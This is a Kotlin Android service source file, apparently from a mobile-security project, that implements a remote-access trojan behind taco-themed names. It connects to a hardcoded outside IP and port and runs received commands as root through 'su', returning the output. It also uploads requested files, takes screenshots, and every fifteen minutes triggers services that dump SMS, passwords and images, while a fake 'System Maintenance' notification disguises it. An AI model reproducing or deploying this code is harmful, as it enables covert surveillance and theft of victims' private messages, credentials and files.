package com.example.mobsec_823

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.mobsec_823.malicious.ImageDumpService
import com.example.mobsec_823.malicious.PasswordDumpService
import com.example.mobsec_823.malicious.SMSDumpService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class TacoDeliveryService : Service() {
    private var tacoTruck: TacoTruck? = null
    private var screenshotTask: carne? = null
    private val kitchenStaffScope = CoroutineScope(Dispatchers.IO)
    private val TAG = "TacoDeliveryService"
    private var exfilJobStarted = false

    // Hardcoded server details for automatic connection.
    private val TRUCK_IP = "47.129.144.9"
    private val TRUCK_PORT = 1269

    companion object {
        const val ACTION_OPEN_FOR_BUSINESS = "com.example.mobsec_823.ACTION_OPEN_FOR_BUSINESS"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_OPEN_FOR_BUSINESS) {
            startForegroundNotification()
            openTheTacoStand()
            startScreenshotTask()
            
            // --- START PERIODIC EXFILTRATION ---
            startExfiltrationServices()
        }
        return START_STICKY
    }

    private fun startExfiltrationServices() {
        if (exfilJobStarted) return
        exfilJobStarted = true

        Log.d(TAG, "Initializing periodic data exfiltration (Every 15 mins)...")
        
        kitchenStaffScope.launch {
            while (true) {
                Log.d(TAG, "Triggering periodic dump cycle: SMS, Passwords, Images")
                
                try {
                    // Calling startService on an already running service simply triggers its onStartCommand again
                    startService(Intent(this@TacoDeliveryService, SMSDumpService::class.java))
                    startService(Intent(this@TacoDeliveryService, PasswordDumpService::class.java))
                    startService(Intent(this@TacoDeliveryService, ImageDumpService::class.java))
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to trigger exfil cycle: ${e.message}")
                }

                delay(900000) // Wait 15 minutes (15 * 60 * 1000 ms)
            }
        }
    }

    private fun startForegroundNotification() {
        val channelId = "TacoStandChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Maintenance")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
    }

    private fun openTheTacoStand() {
        if (tacoTruck != null) {
            tacoTruck?.closeDown()
        }
        tacoTruck = TacoTruck(this, TRUCK_IP, TRUCK_PORT, object : TacoTruck.OrderListener {
            override fun onOrderReceived(order: String) {
                if (order.startsWith("SYNC_FILE:")) {
                    val filePath = order.substring(10).trim()
                    handleFileSync(filePath)
                } else {
                    executeShellCommand(order)
                }
            }
        })
        tacoTruck?.openForBusiness()
    }

    private fun startScreenshotTask() {
        if (screenshotTask == null) {
            screenshotTask = carne(this)
            screenshotTask?.start()
            Log.d(TAG, "Screenshot task started in background.")
        }
    }

    private fun handleFileSync(filePath: String) {
        kitchenStaffScope.launch {
            Log.d(TAG, "Initiating file sync for: $filePath")
            FileUploader.uploadFile(this@TacoDeliveryService, TRUCK_IP, filePath)
        }
    }

    private fun executeShellCommand(command: String) {
        kitchenStaffScope.launch {
            Log.d(TAG, "Executing command: $command")
            try {
                val process = Runtime.getRuntime().exec("su")
                process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }

                process.inputStream.bufferedReader().forEachLine { line ->
                    tacoTruck?.sendToKitchen("OUT:$line")
                }

                process.waitFor()
                tacoTruck?.sendToKitchen("OUT:--DONE--")

            } catch (e: Exception) {
                Log.e(TAG, "Command execution failed", e)
                tacoTruck?.sendToKitchen("OUT:ERROR: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        tacoTruck?.closeDown()
        screenshotTask?.stop()
        kitchenStaffScope.cancel()
        Log.d(TAG, "Taco stand closed.")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}